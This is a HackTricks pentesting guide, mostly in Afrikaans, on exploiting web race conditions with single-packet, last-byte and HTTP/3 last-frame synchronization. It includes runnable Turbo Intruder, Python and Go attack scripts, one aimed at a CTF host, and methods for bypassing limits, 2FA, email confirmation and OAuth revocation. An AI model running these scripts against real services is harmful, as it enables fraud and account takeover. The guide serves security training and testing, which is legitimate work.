# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Vir 'n diep begrip van hierdie tegniek, kyk na die oorspronklike verslag by [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Verbetering van Race Condition-aanvalle

Die hoofhindernis om voordeel uit race conditions te trek is om seker te maak dat meerdere requests tegelyk hanteer word, met **baie min verskil in hul verwerkingsugt — ideaal minder as 1ms**.

Hier is 'n paar tegnieke vir die sinchronisering van versoeke:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Ondersteun die stuur van twee versoeke oor 'n enkele TCP-verbinding, wat die impak van netwerk-jitter verminder. Weens variasies aan die bedienerkant kan twee versoeke egter nie genoegsaam wees vir 'n betroubare race condition-exploit nie.
- **HTTP/1.1 'Last-Byte Sync'**: Maak voorsiening om die meeste dele van 20–30 versoeke vooraf te stuur, terwyl 'n klein fragment teruggehou word wat dan gesamentlik gestuur word om gelyktydige aankoms by die bediener te bereik.

Voorbereiding vir Last-Byte Sync behels:

1. Stuur headers en body-data minus die finale byte sonder om die stroom te eindig.
2. Pauzeer vir 100ms ná die aanvanklike stuur.
3. Deaktiveer TCP_NODELAY om Nagle's algorithm te gebruik vir die saamgroepering van finale frames.
4. Pinging om die verbinding op te warm.

Die daaropvolgende stuur van die teruggehoue frames behoort te lei tot hul aankoms in 'n enkele pakket, verifieerbaar met Wireshark. Hierdie metode is nie van toepassing op statiese lêers nie, wat gewoonlik nie by RC-aanvalle betrokke is nie.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3 ry oor QUIC (UDP). Daar is geen TCP‑coalescing of Nagle om op te staat te maak nie, so klassieke last‑byte sync werk nie met standaard clients nie. In plaas daarvan moet jy doelbewus meerdere QUIC stream‑final DATA frames (FIN) in dieselfde UDP datagram saamvoeg sodat die bediener al die teikenvrae in dieselfde skedulerings‑tick verwerk.
- **How to do it**: Gebruik 'n doelgeboude biblioteek wat QUIC frame‑beheer blootstel. Byvoorbeeld, H3SpaceX manipuleer quic-go om HTTP/3 last‑frame synchronization te implementeer vir beide requests met 'n body en GET‑styl versoeke sonder 'n body.
- Requests‑with‑body: send HEADERS + DATA minus the last byte for N streams, then flush the final byte of each stream together.
- GET‑style: craft fake DATA frames (or a tiny body with Content‑Length) and end all streams in one datagram.
- **Practical limits**:
- Concurrency is bounded by the peer’s QUIC max_streams transport parameter (similar to HTTP/2’s SETTINGS_MAX_CONCURRENT_STREAMS). If it’s low, open multiple H3 connections and spread the race across them.
- UDP datagram size and path MTU cap how many stream‑final frames you can coalesce. The library handles splitting into multiple datagrams if needed, but a single‑datagram flush is most reliable.
- **Practice**: Daar is publieke H2/H3 race labs en voorbeeld‑exploits wat H3SpaceX vergesel.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Aanpassing by Bediener-argitektuur

Om die teiken se argitektuur te verstaan is noodsaaklik. Front-end servers kan versoeke anders roete, wat die timing beïnvloed. Preemptiewe server-side connection warming deur onbeduidende versoeke kan versoektiming normaliseer.

#### Hantering van sessiegebaseerde grendeling

Raamwerke soos PHP se session handler serialiseer versoeke per sessie, wat kwesbaarhede moontlik verberg. Deur verskillende session tokens vir elke versoek te gebruik, kan jy hierdie probleem omseil.

#### Oorkoming van tempo- of hulpbronbeperkings

As connection warming onbevoeg is, kan jy web servers se rate- of resource limit-vertragings doelbewus veroorsaak deur 'n vloed van dummy versoeke; dit kan die single-packet attack vergemaklik deur 'n server-side vertraging te skep wat race conditions bevoordeel.

## Aanvalsvoorbeelde

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: You can send the request to **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), you can change in the request the value you want to brute force for **`%s`** like in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` and then select the **`examples/race-single-packer-attack.py`** from the drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Indien die web nie HTTP2 ondersteun (slegs HTTP1.1), gebruik `Engine.THREADED` of `Engine.BURP` in plaas van `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Indien jy 'n versoek na 1 endpoint moet stuur en daarna verskeie na ander endpoints om die RCE te trigger, kan jy die `race-single-packet-attack.py`-script verander na iets soos:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Dit is ook beskikbaar in **Repeater** via die nuwe '**Send group in parallel**' opsie in Burp Suite.
- Vir **limit-overrun** kan jy net die **same request 50 times** by die groep voeg.
- Vir **connection warming** kan jy **add** aan die **beginning** van die **group** 'n paar **requests** na 'n nie-statiese deel van die web server voeg.
- Vir **delaying** van die proses **between** die verwerking van **one request and another** in 'n 2 substates stappe, kan jy **add extra requests between** albei requests.
- Vir 'n **multi-endpoint** RC kan jy begin deur die **request** te stuur wat **goes to the hidden state** en dan **50 requests** direk daarna te stuur wat die **hidden state exploits**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Die doel van hierdie script is om die e-pos van 'n gebruiker te verander terwyl dit aanhoudend verifieer totdat die **verification token** van die nuwe e-pos by die laaste e-pos aankom (dit is omdat die kode 'n RC getoon het waar dit moontlik was om 'n e-pos te wysig maar die verification na die ou een gestuur is omdat die veranderlike wat die e-pos aandui reeds met die eerste gevul was).\
Wanneer die woord "objetivo" in die ontvangde e-posse gevind word, weet ons ons het die **verification token** van die veranderde e-pos ontvang en ons beëindig die attack.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Engine selection: gebruik `Engine.BURP2` op HTTP/2 teikens om die single‑packet attack te aktiveer; val terug op `Engine.THREADED` of `Engine.BURP` vir HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: queue baie kopieë met `gate='race1'` (of per‑attempt gates), wat die staart van elke request terughou; `openGate('race1')` flush al die staartstukke saam sodat hulle byna terselfdertyd aankom.
- Diagnostics: negatiewe timestamps in Turbo Intruder dui aan dat die server geantwoord het voordat die request ten volle gestuur is, wat oorvleueling bewys. Dit word verwag in ware races.
- Connection warming: stuur eers 'n ping of 'n paar onskadelike requests om die tydsberekeninge te stabiliseer; skakel opsioneel `TCP_NODELAY` af om die final frames te help groepeer.

### Improving Single Packet Attack

In die oorspronklike navorsing word verduidelik dat hierdie attack 'n limiet van 1,500 bytes het. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), is verduidelik hoe dit moontlik is om die 1,500-byte beperking van die single packet attack uit te brei tot die **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) en hulle in 'n ander volgorde te stuur, wat voorkom dat die pakket herassembleer word totdat al die fragmente by die bediener aangekom het. Hierdie tegniek het die navorser toegelaat om sowat 10,000 requests in ongeveer 166ms te stuur.

Let wel dat alhoewel hierdie verbetering die attack meer betroubaar maak in RC wat honderde/duisende pakkette vereis om terselfdertyd aan te kom, dit ook sagtewarebeperkings kan hê. Sommige populêre HTTP-servers soos Apache, Nginx en Go het 'n streng `SETTINGS_MAX_CONCURRENT_STREAMS` instelling van 100, 128 en 250. Ander soos NodeJS en nghttp2 het dit egter onbeperk.  
Dit beteken basies dat Apache slegs 100 HTTP-verbindinge vanaf 'n enkele TCP-verbinding sal oorweeg (wat hierdie RC attack beperk). Vir HTTP/3 is die analoog hieraan QUIC se max_streams transportparameter – as dit klein is, versprei jou race oor meerdere QUIC-verbindinge.

You can find some examples using this technique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research hierdie was 'n paar payloads wat gebruik is wat net probeer het om die pakkette so vinnig as moontlik te stuur om 'n RC te veroorsaak.

- **Repeater:** Kyk na die voorbeelde in die vorige afdeling.
- **Intruder**: Stuur die **request** na **Intruder**, stel die **number of threads** op **30** in die **Options menu**, kies as payload **Null payloads** en genereer **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodologie**

### Limiet-oorloop / TOCTOU

Dit is die mees basiese tipe race condition waar **kwesbaarhede** wat **verskyn** in plekke wat **die aantal kere beperk wat jy 'n aksie kan uitvoer**. Soos om dieselfde afslagkode verskeie kere in 'n webwinkel te gebruik. 'n Baie maklike voorbeeld is te vinde in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) of in [**this bug**](https://hackerone.com/reports/759247)**.**

Daar is baie variasies van hierdie soort aanval, insluitend:

- Inlos van 'n geskenkkaart verskeie kere
- Beoordeel 'n produk verskeie kere
- Opneem of oordra kontant bo jou rekeningbalans
- Hergebruik van 'n enkele CAPTCHA-oplossing
- Om 'n anti-brute-force rate limit te omseil

### **Verborge substates**

Om komplekse race conditions te eksploiteer behels dikwels om voordeel te trek uit kortgeleenthede om met verborge of **ongewenste masjien-substate** te interaksie. Hier is hoe om dit te benader:

1. **Identifiseer Potensiële Verborge Substates**
- Begin deur eindpunte te identifiseer wat kritieke data wysig of daarmee interaksie het, soos gebruikersprofiele of password reset processes. Fokus op:
- **Storage**: Gee voorkeur aan eindpunte wat server-side permanente data manipuleer bo dié wat data client-side hanteer.
- **Action**: Soek na operasies wat bestaande data verander, wat meer geneig is om uitbuitbare toestande te skep in vergelyking met dié wat nuwe data byvoeg.
- **Keying**: Suksesvolle aanvalle behels gewoonlik operasies wat op dieselfde identifiseerder gegrond is, bv. username of reset token.
2. **Voer Aanvanklike Probing uit**
- Toets die geïdentifiseerde eindpunte met race condition-aanvalle en let op enige afwykings van verwagte uitkomste. Onverwagte reaksies of veranderinge in toepassinggedrag kan op 'n kwesbaarheid dui.
3. **Demonstreer die Kwesbaarheid**
- Beperk die aanval tot die minimale aantal requests wat nodig is om die kwesbaarheid uit te buit, dikwels net twee. Hierdie stap kan meerdere pogings of outomatisering vereis as gevolg van die presiese tyding wat betrokke is.

### Tydsgevoelige Aanvalle

Presisie in die tyding van requests kan kwesbaarhede openbaar, veral wanneer voorspelbare metodes soos timestamps gebruik word vir security tokens. Byvoorbeeld, die genereer van password reset tokens gebaseer op timestamps kan identiese tokens vir gelyktydige requests toelaat.

**Om te Ontgin:**

- Gebruik presiese tyding, soos 'n single packet attack, om gelyktydige password reset requests te maak. Identiese tokens dui op 'n kwesbaarheid.

**Voorbeeld:**

- Vraag twee password reset tokens terselfdertyd aan en vergelyk hulle. Ooreenstemmende tokens dui op 'n fout in token-generering.

**Kyk na dit** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **om dit te probeer.**

## Verborge substates gevallestudies

### Betaal & voeg 'n Item by

Kyk na hierdie [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) om te sien hoe om **te betaal** in 'n winkel en **'n ekstra** item by te voeg waarvoor jy **nie hoef te betaal nie**.

### Bevestig ander e-posadresse

Die idee is om terselfdertyd 'n e-posadres te **verifieer en dit na 'n ander een te verander** om uit te vind of die platform die nuwe een verifieer.

### Verander e-pos na 2 e-posadresse (Cookie-gebaseerd)

Volgens [**this research**](https://portswigger.net/research/smashing-the-state-machine) was Gitlab op hierdie manier kwesbaar vir 'n takeover omdat dit moontlik die **email verification token of one email to the other email** kon stuur.

**Kyk na dit** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **om dit te probeer.**

### Verborge Database-state / Confirmation Bypass

As **2 different writes** gebruik word om **inligting** binne 'n **database** by te voeg, is daar 'n klein tydperk waar **slegs die eerste data geskryf is** binne die database. Byvoorbeeld, wanneer 'n gebruiker geskep word kan die **username** en **password** geskryf word en **dan die token** om die nuutgeskepte rekening te bevestig geskryf word. Dit beteken dat vir 'n kort tyd die **token om 'n rekening te bevestig null** is.

Daarom kan **registrasie van 'n rekening en die stuur van verskeie requests met 'n leë token** (`token=` of `token[]=` of enige ander variasie) om die rekening dadelik te bevestig moontlik toelaat om c**onfirm 'n rekening** waar jy nie die e-pos beheer nie.

**Kyk na dit** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **om dit te probeer.**

### Bypass 2FA

Die volgende pseudo-code is kwesbaar vir race condition omdat binne 'n baie kort tydperk die **2FA word nie afgedwing nie** terwyl die session geskep word:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 ewigdurende persistentie

Daar is verskeie [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Hierdie dienste laat jou toe om 'n toepassing te skep en gebruikers wat deur die provider geregistreer is, te autentiseer. Om dit te kan doen, sal die **client** jou moet toelaat om **jou toepassing** toegang tot sommige van hul data binne die **OAUth provider** te gee.\
Dus, tot hier net 'n gewone aanmelding met google/linkedin/github... waar jy 'n bladsy kry wat sê: "Application <InsertCoolName> wants to access you information, do you want to allow it?"

#### Race Condition in `authorization_code`

Die **probleem** verskyn wanneer jy dit **aanvaar** en dit outomaties 'n **`authorization_code`** na die kwaadwillige toepassing stuur. Dan misbruik hierdie **toepassing 'n Race Condition in die OAUth service provider om meer as een AT/RT** (_Authentication Token/Refresh Token_) van die **`authorization_code`** vir jou rekening te genereer. Basies sal dit die feit misbruik dat jy die toepassing toegang tot jou data gegee het om **verskeie rekeninge te skep**. As jy dan ophou om die toepassing toegang tot jou data te gee, sal een paar AT/RT verwyder word, maar die ander sal steeds geldig bly.

#### Race Condition in `Refresh Token`

Sodra jy 'n **geldige RT** verkry het, kan jy probeer om dit te **misbruik om verskeie AT/RT te genereer**, en **selfs as die gebruiker die bevoegdhede vir die kwaadwillige toepassing kanselleer**, sal **verskeie RTs steeds geldig wees.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) vind jy 'n PoC in Java om websocket‑boodskappe gelyktydig te stuur om **Race Conditions ook in Web Sockets** te misbruik.
- Met Burp se WebSocket Turbo Intruder kan jy die **THREADED** engine gebruik om meerdere WS‑verbindinge te skep en payloads gelyktydig te stuur. Begin by die amptelike voorbeeld en pas `config()` (thread count) vir concurrency aan; dit is dikwels meer betroubaar as om alles op 'n enkele verbinding te groepeer wanneer jy probeer om server‑kant state oor WS handlers te laat meeding. Sien [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Verwysings

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
